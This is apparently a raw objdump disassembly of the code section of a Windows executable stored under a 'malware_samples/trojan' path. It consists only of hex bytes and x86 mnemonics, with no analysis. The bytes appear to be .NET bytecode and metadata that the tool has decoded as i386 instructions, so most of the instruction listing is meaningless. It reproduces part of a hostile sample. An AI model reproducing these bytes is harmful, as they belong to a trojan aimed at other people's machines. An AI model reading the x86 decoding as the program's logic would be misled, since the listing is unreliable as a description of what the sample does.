
malware_samples/trojan/1de72bb4f116e969faff90c1e915e70620b900e3117788119cffc644956a9183.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f4                   	hlt
  402001:	36 00 00             	add    %al,%ss:(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 98 25 00    	add    %al,0x259800
  402013:	00 0c 11             	add    %cl,(%ecx,%edx,1)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	05 00 00 06 00       	add    $0x60000,%eax
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 1b                	add    %bl,(%ebx)
  402051:	30 04 00             	xor    %al,(%eax,%eax,1)
  402054:	55                   	push   %ebp
  402055:	00 00                	add    %al,(%eax)
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 02                	adc    %eax,(%edx)
  40205d:	7b 01                	jnp    0x402060
  40205f:	00 00                	add    %al,(%eax)
  402061:	04 72                	add    $0x72,%al
  402063:	01 00                	add    %eax,(%eax)
  402065:	00 70 73             	add    %dh,0x73(%eax)
  402068:	0f 00 00             	sldt   (%eax)
  40206b:	0a 73 10             	or     0x10(%ebx),%dh
  40206e:	00 00                	add    %al,(%eax)
  402070:	0a 73 11             	or     0x11(%ebx),%dh
  402073:	00 00                	add    %al,(%eax)
  402075:	0a 0a                	or     (%edx),%cl
  402077:	06                   	push   %es
  402078:	72 1d                	jb     0x402097
  40207a:	00 00                	add    %al,(%eax)
  40207c:	70 6f                	jo     0x4020ed
  40207e:	12 00                	adc    (%eax),%al
  402080:	00 0a                	add    %cl,(%edx)
  402082:	0b 07                	or     (%edi),%eax
  402084:	72 2b                	jb     0x4020b1
  402086:	00 00                	add    %al,(%eax)
  402088:	70 03                	jo     0x40208d
  40208a:	6f                   	outsl  %ds:(%esi),(%dx)
  40208b:	13 00                	adc    (%eax),%eax
  40208d:	00 0a                	add    %cl,(%edx)
  40208f:	06                   	push   %es
  402090:	72 1d                	jb     0x4020af
  402092:	00 00                	add    %al,(%eax)
  402094:	70 07                	jo     0x40209d
  402096:	73 14                	jae    0x4020ac
  402098:	00 00                	add    %al,(%eax)
  40209a:	0a 6f 15             	or     0x15(%edi),%ch
  40209d:	00 00                	add    %al,(%eax)
  40209f:	0a 26                	or     (%esi),%ah
  4020a1:	17                   	pop    %ss
  4020a2:	0c de                	or     $0xde,%al
  4020a4:	0a 06                	or     (%esi),%al
  4020a6:	2c 06                	sub    $0x6,%al
  4020a8:	06                   	push   %es
  4020a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020aa:	16                   	push   %ss
  4020ab:	00 00                	add    %al,(%eax)
  4020ad:	0a dc                	or     %ah,%bl
  4020af:	08 2a                	or     %ch,(%edx)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	00 01                	add    %al,(%ecx)
  4020b5:	10 00                	adc    %al,(%eax)
  4020b7:	00 02                	add    %al,(%edx)
  4020b9:	00 1b                	add    %bl,(%ebx)
  4020bb:	00 2e                	add    %ch,(%esi)
  4020bd:	49                   	dec    %ecx
  4020be:	00 0a                	add    %cl,(%edx)
  4020c0:	00 00                	add    %al,(%eax)
  4020c2:	00 00                	add    %al,(%eax)
  4020c4:	46                   	inc    %esi
  4020c5:	28 17                	sub    %dl,(%edi)
  4020c7:	00 00                	add    %al,(%eax)
  4020c9:	0a 02                	or     (%edx),%al
  4020cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4020cc:	18 00                	sbb    %al,(%eax)
  4020ce:	00 0a                	add    %cl,(%edx)
  4020d0:	28 19                	sub    %bl,(%ecx)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	0a 2a                	or     (%edx),%ch
  4020d6:	00 00                	add    %al,(%eax)
  4020d8:	13 30                	adc    (%eax),%esi
  4020da:	02 00                	add    (%eax),%al
  4020dc:	13 00                	adc    (%eax),%eax
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	02 00                	add    (%eax),%al
  4020e2:	00 11                	add    %dl,(%ecx)
  4020e4:	02 28                	add    (%eax),%ch
  4020e6:	1a 00                	sbb    (%eax),%al
  4020e8:	00 0a                	add    %cl,(%edx)
  4020ea:	0a 28                	or     (%eax),%ch
  4020ec:	17                   	pop    %ss
  4020ed:	00 00                	add    %al,(%eax)
  4020ef:	0a 06                	or     (%esi),%al
  4020f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f2:	1b 00                	sbb    (%eax),%eax
  4020f4:	00 0a                	add    %cl,(%edx)
  4020f6:	2a 00                	sub    (%eax),%al
  4020f8:	13 30                	adc    (%eax),%esi
  4020fa:	04 00                	add    $0x0,%al
  4020fc:	7e 04                	jle    0x402102
  4020fe:	00 00                	add    %al,(%eax)
  402100:	03 00                	add    (%eax),%eax
  402102:	00 11                	add    %dl,(%ecx)
  402104:	03 8e 69 19 2f 0b    	add    0xb2f1969(%esi),%ecx
  40210a:	72 43                	jb     0x40214f
  40210c:	00 00                	add    %al,(%eax)
  40210e:	70 28                	jo     0x402138
  402110:	1c 00                	sbb    $0x0,%al
  402112:	00 0a                	add    %cl,(%edx)
  402114:	2a 03                	sub    (%ebx),%al
  402116:	16                   	push   %ss
  402117:	9a 72 22 02 00 70 28 	lcall  $0x2870,$0x22272
  40211e:	1d 00 00 0a 39       	sbb    $0x390a0000,%eax
  402123:	37                   	aaa
  402124:	02 00                	add    (%eax),%al
  402126:	00 03                	add    %al,(%ebx)
  402128:	17                   	pop    %ss
  402129:	9a 0a 03 18 9a 0b 72 	lcall  $0x720b,$0x9a18030a
  402130:	2a 02                	sub    (%edx),%al
  402132:	00 70 0c             	add    %dh,0xc(%eax)
  402135:	72 2a                	jb     0x402161
  402137:	02 00                	add    (%eax),%al
  402139:	70 0d                	jo     0x402148
  40213b:	72 2a                	jb     0x402167
  40213d:	02 00                	add    (%eax),%al
  40213f:	70 13                	jo     0x402154
  402141:	04 07                	add    $0x7,%al
  402143:	72 2c                	jb     0x402171
  402145:	02 00                	add    (%eax),%al
  402147:	70 28                	jo     0x402171
  402149:	1d 00 00 0a 2c       	sbb    $0x2c0a0000,%eax
  40214e:	06                   	push   %es
  40214f:	03 19                	add    (%ecx),%ebx
  402151:	9a 0c 2b 09 03 19 9a 	lcall  $0x9a19,$0x3092b0c
  402158:	0d 03 1a 9a 13       	or     $0x139a1a03,%eax
  40215d:	04 73                	add    $0x73,%al
  40215f:	1e                   	push   %ds
  402160:	00 00                	add    %al,(%eax)
  402162:	0a 13                	or     (%ebx),%dl
  402164:	05 20 88 13 00       	add    $0x138820,%eax
  402169:	00 13                	add    %dl,(%ebx)
  40216b:	06                   	push   %es
  40216c:	02 72 34             	add    0x34(%edx),%dh
  40216f:	02 00                	add    (%eax),%al
  402171:	70 06                	jo     0x402179
  402173:	72 3a                	jb     0x4021af
  402175:	02 00                	add    (%eax),%al
  402177:	70 28                	jo     0x4021a1
  402179:	1f                   	pop    %ds
  40217a:	00 00                	add    %al,(%eax)
  40217c:	0a 11                	or     (%ecx),%dl
  40217e:	05 73 20 00 00       	add    $0x2073,%eax
  402183:	0a 7d 01             	or     0x1(%ebp),%bh
  402186:	00 00                	add    %al,(%eax)
  402188:	04 02                	add    $0x2,%al
  40218a:	7b 01                	jnp    0x40218d
  40218c:	00 00                	add    %al,(%eax)
  40218e:	04 6f                	add    $0x6f,%al
  402190:	21 00                	and    %eax,(%eax)
  402192:	00 0a                	add    %cl,(%edx)
  402194:	19 6f 22             	sbb    %ebp,0x22(%edi)
  402197:	00 00                	add    %al,(%eax)
  402199:	0a 02                	or     (%edx),%al
  40219b:	7b 01                	jnp    0x40219e
  40219d:	00 00                	add    %al,(%eax)
  40219f:	04 6f                	add    $0x6f,%al
  4021a1:	21 00                	and    %eax,(%eax)
  4021a3:	00 0a                	add    %cl,(%edx)
  4021a5:	17                   	pop    %ss
  4021a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a7:	23 00                	and    (%eax),%eax
  4021a9:	00 0a                	add    %cl,(%edx)
  4021ab:	02 7b 01             	add    0x1(%ebx),%bh
  4021ae:	00 00                	add    %al,(%eax)
  4021b0:	04 6f                	add    $0x6f,%al
  4021b2:	24 00                	and    $0x0,%al
  4021b4:	00 0a                	add    %cl,(%edx)
  4021b6:	07                   	pop    %es
  4021b7:	72 2c                	jb     0x4021e5
  4021b9:	02 00                	add    (%eax),%al
  4021bb:	70 28                	jo     0x4021e5
  4021bd:	1d 00 00 0a 39       	sbb    $0x390a0000,%eax
  4021c2:	c8 00 00 00          	enter  $0x0,$0x0
  4021c6:	72 52                	jb     0x40221a
  4021c8:	02 00                	add    (%eax),%al
  4021ca:	70 08                	jo     0x4021d4
  4021cc:	28 02                	sub    %al,(%edx)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	06                   	push   %es
  4021d1:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4021d7:	07                   	pop    %es
  4021d8:	72 74                	jb     0x40224e
  4021da:	02 00                	add    (%eax),%al
  4021dc:	70 11                	jo     0x4021ef
  4021de:	07                   	pop    %es
  4021df:	72 7e                	jb     0x40225f
  4021e1:	02 00                	add    (%eax),%al
  4021e3:	70 28                	jo     0x40220d
  4021e5:	1f                   	pop    %ds
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	0a 13                	or     (%ebx),%dl
  4021ea:	08 02                	or     %al,(%edx)
  4021ec:	72 52                	jb     0x402240
  4021ee:	02 00                	add    (%eax),%al
  4021f0:	70 11                	jo     0x402203
  4021f2:	08 28                	or     %ch,(%eax)
  4021f4:	02 00                	add    (%eax),%al
  4021f6:	00 06                	add    %al,(%esi)
  4021f8:	28 25 00 00 0a 28    	sub    %ah,0x280a0000
  4021fe:	01 00                	add    %eax,(%eax)
  402200:	00 06                	add    %al,(%esi)
  402202:	26 72 39             	es jb  0x40223e
  402205:	04 00                	add    $0x0,%al
  402207:	70 28                	jo     0x402231
  402209:	1c 00                	sbb    $0x0,%al
  40220b:	00 0a                	add    %cl,(%edx)
  40220d:	11 06                	adc    %eax,(%esi)
  40220f:	28 26                	sub    %ah,(%esi)
  402211:	00 00                	add    %al,(%eax)
  402213:	0a 02                	or     (%edx),%al
  402215:	7b 01                	jnp    0x402218
  402217:	00 00                	add    %al,(%eax)
  402219:	04 72                	add    $0x72,%al
  40221b:	57                   	push   %edi
  40221c:	04 00                	add    $0x0,%al
  40221e:	70 73                	jo     0x402293
  402220:	0f 00 00             	sldt   (%eax)
  402223:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402226:	11 00                	adc    %eax,(%eax)
  402228:	00 0a                	add    %cl,(%edx)
  40222a:	25 72 6d 04 00       	and    $0x46d72,%eax
  40222f:	70 6f                	jo     0x4022a0
  402231:	12 00                	adc    (%eax),%al
  402233:	00 0a                	add    %cl,(%edx)
  402235:	13 09                	adc    (%ecx),%ecx
  402237:	11 09                	adc    %ecx,(%ecx)
  402239:	72 8b                	jb     0x4021c6
  40223b:	04 00                	add    $0x0,%al
  40223d:	70 72                	jo     0x4022b1
  40223f:	2a 02                	sub    (%edx),%al
  402241:	00 70 6f             	add    %dh,0x6f(%eax)
  402244:	13 00                	adc    (%eax),%eax
  402246:	00 0a                	add    %cl,(%edx)
  402248:	11 09                	adc    %ecx,(%ecx)
  40224a:	72 a3                	jb     0x4021ef
  40224c:	04 00                	add    $0x0,%al
  40224e:	70 72                	jo     0x4022c2
  402250:	b9 04 00 70 6f       	mov    $0x6f700004,%ecx
  402255:	13 00                	adc    (%eax),%eax
  402257:	00 0a                	add    %cl,(%edx)
  402259:	72 6d                	jb     0x4022c8
  40225b:	04 00                	add    $0x0,%al
  40225d:	70 11                	jo     0x402270
  40225f:	09 14 6f             	or     %edx,(%edi,%ebp,2)
  402262:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  402267:	0a 72 c1             	or     -0x3f(%edx),%dh
  40226a:	04 00                	add    $0x0,%al
  40226c:	70 11                	jo     0x40227f
  40226e:	0a 72 e1             	or     -0x1f(%edx),%dh
  402271:	04 00                	add    $0x0,%al
  402273:	70 6f                	jo     0x4022e4
  402275:	27                   	daa
  402276:	00 00                	add    %al,(%eax)
  402278:	0a 6f 28             	or     0x28(%edi),%ch
  40227b:	00 00                	add    %al,(%eax)
  40227d:	0a 28                	or     (%eax),%ch
  40227f:	03 00                	add    (%eax),%eax
  402281:	00 06                	add    %al,(%esi)
  402283:	28 25 00 00 0a 28    	sub    %ah,0x280a0000
  402289:	1c 00                	sbb    $0x0,%al
  40228b:	00 0a                	add    %cl,(%edx)
  40228d:	2a 07                	sub    (%edi),%al
  40228f:	72 ef                	jb     0x402280
  402291:	04 00                	add    $0x0,%al
  402293:	70 28                	jo     0x4022bd
  402295:	1d 00 00 0a 39       	sbb    $0x390a0000,%eax
  40229a:	e3 02                	jecxz  0x40229e
  40229c:	00 00                	add    %al,(%eax)
  40229e:	09 28                	or     %ebp,(%eax)
  4022a0:	29 00                	sub    %eax,(%eax)
  4022a2:	00 0a                	add    %cl,(%edx)
  4022a4:	13 0b                	adc    (%ebx),%ecx
  4022a6:	02 7b 01             	add    0x1(%ebx),%bh
  4022a9:	00 00                	add    %al,(%eax)
  4022ab:	04 72                	add    $0x72,%al
  4022ad:	57                   	push   %edi
  4022ae:	04 00                	add    $0x0,%al
  4022b0:	70 73                	jo     0x402325
  4022b2:	0f 00 00             	sldt   (%eax)
  4022b5:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4022b8:	11 00                	adc    %eax,(%eax)
  4022ba:	00 0a                	add    %cl,(%edx)
  4022bc:	25 72 fd 04 00       	and    $0x4fd72,%eax
  4022c1:	70 6f                	jo     0x402332
  4022c3:	12 00                	adc    (%eax),%al
  4022c5:	00 0a                	add    %cl,(%edx)
  4022c7:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4022ca:	0c 72                	or     $0x72,%al
  4022cc:	1b 05 00 70 20 02    	sbb    0x2207000,%eax
  4022d2:	00 00                	add    %al,(%eax)
  4022d4:	80 8c 21 00 00 01 6f 	orb    $0x13,0x6f010000(%ecx,%eiz,1)
  4022db:	13 
  4022dc:	00 00                	add    %al,(%eax)
  4022de:	0a 11                	or     (%ecx),%dl
  4022e0:	0c 72                	or     $0x72,%al
  4022e2:	8b 04 00             	mov    (%eax,%eax,1),%eax
  4022e5:	70 72                	jo     0x402359
  4022e7:	2a 02                	sub    (%edx),%al
  4022e9:	00 70 6f             	add    %dh,0x6f(%eax)
  4022ec:	13 00                	adc    (%eax),%eax
  4022ee:	00 0a                	add    %cl,(%edx)
  4022f0:	11 0c 72             	adc    %ecx,(%edx,%esi,2)
  4022f3:	a3 04 00 70 72       	mov    %eax,0x72700004
  4022f8:	ef                   	out    %eax,(%dx)
  4022f9:	04 00                	add    $0x0,%al
  4022fb:	70 6f                	jo     0x40236c
  4022fd:	13 00                	adc    (%eax),%eax
  4022ff:	00 0a                	add    %cl,(%edx)
  402301:	11 0c 72             	adc    %ecx,(%edx,%esi,2)
  402304:	e1 04                	loope  0x40230a
  402306:	00 70 11             	add    %dh,0x11(%eax)
  402309:	0b 28                	or     (%eax),%ebp
  40230b:	19 00                	sbb    %eax,(%eax)
  40230d:	00 0a                	add    %cl,(%edx)
  40230f:	6f                   	outsl  %ds:(%esi),(%dx)
  402310:	13 00                	adc    (%eax),%eax
  402312:	00 0a                	add    %cl,(%edx)
  402314:	72 fd                	jb     0x402313
  402316:	04 00                	add    $0x0,%al
  402318:	70 11                	jo     0x40232b
  40231a:	0c 14                	or     $0x14,%al
  40231c:	6f                   	outsl  %ds:(%esi),(%dx)
  40231d:	15 00 00 0a 26       	adc    $0x260a0000,%eax
  402322:	72 2b                	jb     0x40234f
  402324:	05 00 70 11 04       	add    $0x4117000,%eax
  402329:	28 2a                	sub    %ch,(%edx)
  40232b:	00 00                	add    %al,(%eax)
  40232d:	0a 13                	or     (%ebx),%dl
  40232f:	0d 72 52 02 00       	or     $0x25272,%eax
  402334:	70 11                	jo     0x402347
  402336:	0d 28 02 00 00       	or     $0x228,%eax
  40233b:	06                   	push   %es
  40233c:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  402342:	0e                   	push   %cs
  402343:	11 06                	adc    %eax,(%esi)
  402345:	28 26                	sub    %ah,(%esi)
  402347:	00 00                	add    %al,(%eax)
  402349:	0a 02                	or     (%edx),%al
  40234b:	11 0e                	adc    %ecx,(%esi)
  40234d:	28 01                	sub    %al,(%ecx)
  40234f:	00 00                	add    %al,(%eax)
  402351:	06                   	push   %es
  402352:	26 72 b6             	es jb  0x40230b
  402355:	06                   	push   %es
  402356:	00 70 28             	add    %dh,0x28(%eax)
  402359:	1c 00                	sbb    $0x0,%al
  40235b:	00 0a                	add    %cl,(%edx)
  40235d:	2a 73 1e             	sub    0x1e(%ebx),%dh
  402360:	00 00                	add    %al,(%eax)
  402362:	0a 13                	or     (%ebx),%dl
  402364:	0f 03 16             	lsl    (%esi),%edx
  402367:	9a 13 10 11 0f 03 17 	lcall  $0x1703,$0xf111013
  40236e:	9a 6f 2b 00 00 0a 11 	lcall  $0x110a,$0x2b6f
  402375:	0f 03 18             	lsl    (%eax),%ebx
  402378:	9a 6f 2c 00 00 0a 20 	lcall  $0x200a,$0x2c6f
  40237f:	88 13                	mov    %dl,(%ebx)
  402381:	00 00                	add    %al,(%eax)
  402383:	13 11                	adc    (%ecx),%edx
  402385:	02 72 34             	add    0x34(%edx),%dh
  402388:	02 00                	add    (%eax),%al
  40238a:	70 11                	jo     0x40239d
  40238c:	10 72 3a             	adc    %dh,0x3a(%edx)
  40238f:	02 00                	add    (%eax),%al
  402391:	70 28                	jo     0x4023bb
  402393:	1f                   	pop    %ds
  402394:	00 00                	add    %al,(%eax)
  402396:	0a 11                	or     (%ecx),%dl
  402398:	0f 73                	(bad)
  40239a:	20 00                	and    %al,(%eax)
  40239c:	00 0a                	add    %cl,(%edx)
  40239e:	7d 01                	jge    0x4023a1
  4023a0:	00 00                	add    %al,(%eax)
  4023a2:	04 02                	add    $0x2,%al
  4023a4:	7b 01                	jnp    0x4023a7
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	04 6f                	add    $0x6f,%al
  4023aa:	21 00                	and    %eax,(%eax)
  4023ac:	00 0a                	add    %cl,(%edx)
  4023ae:	19 6f 22             	sbb    %ebp,0x22(%edi)
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	0a 02                	or     (%edx),%al
  4023b5:	7b 01                	jnp    0x4023b8
  4023b7:	00 00                	add    %al,(%eax)
  4023b9:	04 6f                	add    $0x6f,%al
  4023bb:	21 00                	and    %eax,(%eax)
  4023bd:	00 0a                	add    %cl,(%edx)
  4023bf:	17                   	pop    %ss
  4023c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4023c1:	23 00                	and    (%eax),%eax
  4023c3:	00 0a                	add    %cl,(%edx)
  4023c5:	02 7b 01             	add    0x1(%ebx),%bh
  4023c8:	00 00                	add    %al,(%eax)
  4023ca:	04 6f                	add    $0x6f,%al
  4023cc:	24 00                	and    $0x0,%al
  4023ce:	00 0a                	add    %cl,(%edx)
  4023d0:	03 19                	add    (%ecx),%ebx
  4023d2:	9a 72 2c 02 00 70 28 	lcall  $0x2870,$0x22c72
  4023d9:	1d 00 00 0a 39       	sbb    $0x390a0000,%eax
  4023de:	ca 00 00             	lret   $0x0
  4023e1:	00 72 52             	add    %dh,0x52(%edx)
  4023e4:	02 00                	add    (%eax),%al
  4023e6:	70 03                	jo     0x4023eb
  4023e8:	1a 9a 28 02 00 00    	sbb    0x228(%edx),%bl
  4023ee:	06                   	push   %es
  4023ef:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4023f5:	12 72 74             	adc    0x74(%edx),%dh
  4023f8:	02 00                	add    (%eax),%al
  4023fa:	70 11                	jo     0x40240d
  4023fc:	12 72 7e             	adc    0x7e(%edx),%dh
  4023ff:	02 00                	add    (%eax),%al
  402401:	70 28                	jo     0x40242b
  402403:	1f                   	pop    %ds
  402404:	00 00                	add    %al,(%eax)
  402406:	0a 13                	or     (%ebx),%dl
  402408:	13 02                	adc    (%edx),%eax
  40240a:	72 52                	jb     0x40245e
  40240c:	02 00                	add    (%eax),%al
  40240e:	70 11                	jo     0x402421
  402410:	13 28                	adc    (%eax),%ebp
  402412:	02 00                	add    (%eax),%al
  402414:	00 06                	add    %al,(%esi)
  402416:	28 25 00 00 0a 28    	sub    %ah,0x280a0000
  40241c:	01 00                	add    %eax,(%eax)
  40241e:	00 06                	add    %al,(%esi)
  402420:	26 72 39             	es jb  0x40245c
  402423:	04 00                	add    $0x0,%al
  402425:	70 28                	jo     0x40244f
  402427:	1c 00                	sbb    $0x0,%al
  402429:	00 0a                	add    %cl,(%edx)
  40242b:	11 11                	adc    %edx,(%ecx)
  40242d:	28 26                	sub    %ah,(%esi)
  40242f:	00 00                	add    %al,(%eax)
  402431:	0a 02                	or     (%edx),%al
  402433:	7b 01                	jnp    0x402436
  402435:	00 00                	add    %al,(%eax)
  402437:	04 72                	add    $0x72,%al
  402439:	57                   	push   %edi
  40243a:	04 00                	add    $0x0,%al
  40243c:	70 73                	jo     0x4024b1
  40243e:	0f 00 00             	sldt   (%eax)
  402441:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402444:	11 00                	adc    %eax,(%eax)
  402446:	00 0a                	add    %cl,(%edx)
  402448:	25 72 6d 04 00       	and    $0x46d72,%eax
  40244d:	70 6f                	jo     0x4024be
  40244f:	12 00                	adc    (%eax),%al
  402451:	00 0a                	add    %cl,(%edx)
  402453:	13 14 11             	adc    (%ecx,%edx,1),%edx
  402456:	14 72                	adc    $0x72,%al
  402458:	8b 04 00             	mov    (%eax,%eax,1),%eax
  40245b:	70 72                	jo     0x4024cf
  40245d:	2a 02                	sub    (%edx),%al
  40245f:	00 70 6f             	add    %dh,0x6f(%eax)
  402462:	13 00                	adc    (%eax),%eax
  402464:	00 0a                	add    %cl,(%edx)
  402466:	11 14 72             	adc    %edx,(%edx,%esi,2)
  402469:	a3 04 00 70 72       	mov    %eax,0x72700004
  40246e:	b9 04 00 70 6f       	mov    $0x6f700004,%ecx
  402473:	13 00                	adc    (%eax),%eax
  402475:	00 0a                	add    %cl,(%edx)
  402477:	72 6d                	jb     0x4024e6
  402479:	04 00                	add    $0x0,%al
  40247b:	70 11                	jo     0x40248e
  40247d:	14 14                	adc    $0x14,%al
  40247f:	6f                   	outsl  %ds:(%esi),(%dx)
  402480:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  402485:	15 72 c1 04 00       	adc    $0x4c172,%eax
  40248a:	70 11                	jo     0x40249d
  40248c:	15 72 e1 04 00       	adc    $0x4e172,%eax
  402491:	70 6f                	jo     0x402502
  402493:	27                   	daa
  402494:	00 00                	add    %al,(%eax)
  402496:	0a 6f 28             	or     0x28(%edi),%ch
  402499:	00 00                	add    %al,(%eax)
  40249b:	0a 28                	or     (%eax),%ch
  40249d:	03 00                	add    (%eax),%eax
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	28 25 00 00 0a 28    	sub    %ah,0x280a0000
  4024a7:	1c 00                	sbb    $0x0,%al
  4024a9:	00 0a                	add    %cl,(%edx)
  4024ab:	2a 03                	sub    (%ebx),%al
  4024ad:	19 9a 72 ef 04 00    	sbb    %ebx,0x4ef72(%edx)
  4024b3:	70 28                	jo     0x4024dd
  4024b5:	1d 00 00 0a 39       	sbb    $0x390a0000,%eax
  4024ba:	c3                   	ret
  4024bb:	00 00                	add    %al,(%eax)
  4024bd:	00 03                	add    %al,(%ebx)
  4024bf:	1a 9a 28 29 00 00    	sbb    0x2928(%edx),%bl
  4024c5:	0a 13                	or     (%ebx),%dl
  4024c7:	16                   	push   %ss
  4024c8:	02 7b 01             	add    0x1(%ebx),%bh
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 72                	add    $0x72,%al
  4024cf:	57                   	push   %edi
  4024d0:	04 00                	add    $0x0,%al
  4024d2:	70 73                	jo     0x402547
  4024d4:	0f 00 00             	sldt   (%eax)
  4024d7:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4024da:	11 00                	adc    %eax,(%eax)
  4024dc:	00 0a                	add    %cl,(%edx)
  4024de:	25 72 fd 04 00       	and    $0x4fd72,%eax
  4024e3:	70 6f                	jo     0x402554
  4024e5:	12 00                	adc    (%eax),%al
  4024e7:	00 0a                	add    %cl,(%edx)
  4024e9:	13 17                	adc    (%edi),%edx
  4024eb:	11 17                	adc    %edx,(%edi)
  4024ed:	72 1b                	jb     0x40250a
  4024ef:	05 00 70 20 02       	add    $0x2207000,%eax
  4024f4:	00 00                	add    %al,(%eax)
  4024f6:	80 8c 21 00 00 01 6f 	orb    $0x13,0x6f010000(%ecx,%eiz,1)
  4024fd:	13 
  4024fe:	00 00                	add    %al,(%eax)
  402500:	0a 11                	or     (%ecx),%dl
  402502:	17                   	pop    %ss
  402503:	72 8b                	jb     0x402490
  402505:	04 00                	add    $0x0,%al
  402507:	70 72                	jo     0x40257b
  402509:	2a 02                	sub    (%edx),%al
  40250b:	00 70 6f             	add    %dh,0x6f(%eax)
  40250e:	13 00                	adc    (%eax),%eax
  402510:	00 0a                	add    %cl,(%edx)
  402512:	11 17                	adc    %edx,(%edi)
  402514:	72 a3                	jb     0x4024b9
  402516:	04 00                	add    $0x0,%al
  402518:	70 72                	jo     0x40258c
  40251a:	ef                   	out    %eax,(%dx)
  40251b:	04 00                	add    $0x0,%al
  40251d:	70 6f                	jo     0x40258e
  40251f:	13 00                	adc    (%eax),%eax
  402521:	00 0a                	add    %cl,(%edx)
  402523:	11 17                	adc    %edx,(%edi)
  402525:	72 e1                	jb     0x402508
  402527:	04 00                	add    $0x0,%al
  402529:	70 11                	jo     0x40253c
  40252b:	16                   	push   %ss
  40252c:	28 19                	sub    %bl,(%ecx)
  40252e:	00 00                	add    %al,(%eax)
  402530:	0a 6f 13             	or     0x13(%edi),%ch
  402533:	00 00                	add    %al,(%eax)
  402535:	0a 72 fd             	or     -0x3(%edx),%dh
  402538:	04 00                	add    $0x0,%al
  40253a:	70 11                	jo     0x40254d
  40253c:	17                   	pop    %ss
  40253d:	14 6f                	adc    $0x6f,%al
  40253f:	15 00 00 0a 26       	adc    $0x260a0000,%eax
  402544:	72 2b                	jb     0x402571
  402546:	05 00 70 03 1b       	add    $0x1b037000,%eax
  40254b:	9a 28 2a 00 00 0a 13 	lcall  $0x130a,$0x2a28
  402552:	18 72 52             	sbb    %dh,0x52(%edx)
  402555:	02 00                	add    (%eax),%al
  402557:	70 11                	jo     0x40256a
  402559:	18 28                	sbb    %ch,(%eax)
  40255b:	02 00                	add    (%eax),%al
  40255d:	00 06                	add    %al,(%esi)
  40255f:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  402565:	19 11                	sbb    %edx,(%ecx)
  402567:	11 28                	adc    %ebp,(%eax)
  402569:	26 00 00             	add    %al,%es:(%eax)
  40256c:	0a 02                	or     (%edx),%al
  40256e:	11 19                	adc    %ebx,(%ecx)
  402570:	28 01                	sub    %al,(%ecx)
  402572:	00 00                	add    %al,(%eax)
  402574:	06                   	push   %es
  402575:	26 72 b6             	es jb  0x40252e
  402578:	06                   	push   %es
  402579:	00 70 28             	add    %dh,0x28(%eax)
  40257c:	1c 00                	sbb    $0x0,%al
  40257e:	00 0a                	add    %cl,(%edx)
  402580:	2a 2a                	sub    (%edx),%ch
  402582:	32 73 06             	xor    0x6(%ebx),%dh
  402585:	00 00                	add    %al,(%eax)
  402587:	06                   	push   %es
  402588:	02 6f 04             	add    0x4(%edi),%ch
  40258b:	00 00                	add    %al,(%eax)
  40258d:	06                   	push   %es
  40258e:	2a 1e                	sub    (%esi),%bl
  402590:	02 28                	add    (%eax),%ch
  402592:	2d 00 00 0a 2a       	sub    $0x2a0a0000,%eax
  402597:	00 42 53             	add    %al,0x53(%edx)
  40259a:	4a                   	dec    %edx
  40259b:	42                   	inc    %edx
  40259c:	01 00                	add    %eax,(%eax)
  40259e:	01 00                	add    %eax,(%eax)
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	0c 00                	or     $0x0,%al
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	76 34                	jbe    0x4025de
  4025aa:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4025ad:	33 30                	xor    (%eax),%esi
  4025af:	33 31                	xor    (%ecx),%esi
  4025b1:	39 00                	cmp    %eax,(%eax)
  4025b3:	00 00                	add    %al,(%eax)
  4025b5:	00 05 00 6c 00 00    	add    %al,0x6c00
  4025bb:	00 50 03             	add    %dl,0x3(%eax)
  4025be:	00 00                	add    %al,(%eax)
  4025c0:	23 7e 00             	and    0x0(%esi),%edi
  4025c3:	00 bc 03 00 00 8c 04 	add    %bh,0x48c0000(%ebx,%eax,1)
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	23 53 74             	and    0x74(%ebx),%edx
  4025cf:	72 69                	jb     0x40263a
  4025d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4025d2:	67 73 00             	addr16 jae 0x4025d5
  4025d5:	00 00                	add    %al,(%eax)
  4025d7:	00 48 08             	add    %cl,0x8(%eax)
  4025da:	00 00                	add    %al,(%eax)
  4025dc:	e0 06                	loopne 0x4025e4
  4025de:	00 00                	add    %al,(%eax)
  4025e0:	23 55 53             	and    0x53(%ebp),%edx
  4025e3:	00 28                	add    %ch,(%eax)
  4025e5:	0f 00 00             	sldt   (%eax)
  4025e8:	10 00                	adc    %al,(%eax)
